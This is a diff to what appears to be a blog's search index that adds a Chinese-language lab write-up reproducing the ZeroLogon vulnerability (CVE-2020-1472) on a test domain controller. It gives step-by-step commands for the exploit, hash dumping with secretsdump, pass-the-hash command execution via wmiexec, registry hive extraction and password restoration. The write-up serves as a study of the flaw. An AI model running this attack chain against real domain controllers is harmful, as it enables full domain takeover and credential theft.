@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>CVE2020-1472漏洞复现</title>
+      <link href="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
+      
+        <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口，被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码。</p><p>微软MSRC于8月11日 发布了Netlogon 特权提升漏洞安全通告。此漏洞CVE编号CVE-2020-1472， CVSS 评分:10.0。由 Secura 公司的 Tom Tervoort 发现提交并命名为 ZeroLogon</p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>受害者：window server 2016（域控服务器）</p><p>攻击者：win10（python3环境，需下载impacket最新版本）</p><p>工具：<a href="https://github.com/SecuraBV/CVE-2020-1472">https://github.com/SecuraBV/CVE-2020-1472</a> （POC）</p><p>​     <a href="https://github.com/dirkjanm/CVE-2020-1472">https://github.com/dirkjanm/CVE-2020-1472</a> （EXP）</p><h1 id="复现过程坑点"><a href="#复现过程坑点" class="headerlink" title="复现过程坑点"></a>复现过程坑点</h1><p>1、impacket需要最新版本</p><p>2、linux下执行脚本在出现$之类的特殊字符需要\转义，window下不影响</p><h1 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h1><p>首先得自己提起搭建好域控</p><p>IP：192.168.31.53</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%9F%9F%E6%8E%A7ip%E4%BB%A5%E5%8F%8A%E4%B8%BB%E6%9C%BA%E5%90%8D.jpg"></p><h3 id="POC验证漏洞"><a href="#POC验证漏洞" class="headerlink" title="POC验证漏洞"></a>POC验证漏洞</h3><p>使用pip install -r requirements.txt安装所需要的模块（需要手动安装最新版本的impacket）</p><p>impacket下载链接：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a>    去根目录下执行python3 setup.py install</p><p>python3 zerologon_tester.py DC 192.168.31.53       POC验证漏洞</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Poc%E9%AA%8C%E8%AF%81.jpg"></p><h3 id="EXP攻击"><a href="#EXP攻击" class="headerlink" title="EXP攻击"></a>EXP攻击</h3><p>python3 cve-2020-1472-exploit.py DC 192.168.31.53</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/exp.jpg"></p><h3 id="HASH导出"><a href="#HASH导出" class="headerlink" title="HASH导出"></a>HASH导出</h3><p>通过impacket模块的secretsdump.py导出域控上的HASH</p><p>python3 secretsdump.py adtest.com/DC$@192.168.31.53 -no-pass</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%AF%BC%E5%87%BAhash.jpg"></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>我们用刚才导出的管理员hash来操作域控服务器</p><p>Python3 wmiexec.py adtest.com/administrator@192.168.31.53 -hashes :fd97d47fd98caa8d172a09fbfce086fe</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%88%A9%E7%94%A8hash%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.jpg"></p><h3 id="恢复HASH"><a href="#恢复HASH" class="headerlink" title="恢复HASH"></a>恢复HASH</h3><pre><code>reg save HKLM\SYSTEM system.savereg save HKLM\SAM sam.savereg save HKLM\SECURITY security.saveget system.saveget sam.saveget security.savedel system.savedel sam.savedel security.save</code></pre><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort.jpg"></p><p>Python3 secretsdump.py -sam sam.save -system system.save -security security.save local</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort1.jpg"></p><p>使用restorepassword.py进行HASH恢复</p><pre><code>python3 restorepassword.py adtest.com/DC@DC -target-ip 192.168.31.53 -hexpass 0e06e21f1bdc36f0aa33f60eabff715d6c3a64e5a78fbdd6162746b1c2e048791466a59f7c34b1ce125b704e19665e6b6a16b020eac763b27e9a370b78693c54c6d827bb3834e6de16548db240be98b7787b647221f6588bc9573b1ad87085f60cec80353056a45ae3fbed0995431cf0b8ce61e4ae79c2150abbeaf9720d34862c74fab0401545bf07f761068f3012efff70bc432b1ed4cf79ed165150d817a753de8bfc5fc0d533189242b1f21ace60160e6378db707aaf466d0e2ce2d96804d118fccde035242e1b754e7ce39f612bf45f3bacd9b2fd7380788c40215ccef77a84502399a69fea62e64791c3bce634</code></pre><p>成功恢复</p><p><img src="/2020/11/19/CVE2020-1472%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/restort_success.jpg"></p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 漏洞复现 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>基于绿盟与Nessus原始漏洞的快速处理</title>
       <link href="/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/"/>
       <url>/2020/11/15/%E5%9F%BA%E4%BA%8E%E7%BB%BF%E7%9B%9F%E4%B8%8ENessus%E5%8E%9F%E5%A7%8B%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BF%AB%E9%80%9F%E5%A4%84%E7%90%86/</url>
